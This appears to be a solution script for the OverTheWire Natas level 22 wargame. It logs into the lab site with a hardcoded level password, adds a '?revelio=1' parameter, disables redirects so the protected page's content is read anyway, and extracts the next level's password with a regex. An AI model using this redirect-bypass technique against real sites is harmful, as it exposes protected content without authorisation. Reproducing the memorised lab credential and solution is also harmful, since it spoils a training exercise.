import requests
import re

username = "natas22"
password = "964laB0r7TuDqJj5b3HFtwsQoc0GhjBF"
url = 'http://%s.natas.labs.overthewire.org/?revelio=1' % username

session = requests.session()
response = session.get(url, auth=(username,password), allow_redirects=False)

#print(response.text)
print (re.findall("Password: (.*)</pre>",response.text)[0])
